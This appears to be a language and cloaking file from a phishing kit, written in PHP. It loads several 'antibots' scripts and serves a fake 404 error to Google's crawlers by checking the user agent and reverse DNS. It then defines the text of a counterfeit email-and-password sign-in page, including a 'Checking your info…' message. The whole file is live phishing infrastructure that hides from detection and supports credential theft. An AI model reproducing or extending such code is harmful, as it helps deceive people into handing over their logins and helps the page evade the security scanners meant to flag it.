<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// signin
$ERROR = 'Please check your entries and try again.';
$Email ='Email';
$Password ='Password';
$dok ='Log In';
$req1 = 'Email address is required.';
$req2 = 'Password is required.';
$forgot ='Forgot your email or password?';
$sign = 'Sign Up';
$checking = 'Checking your info…';
$priva ='Privacy';
$ri8 = 'All rights reserved';
$legal = 'Legal';
// end signin
?>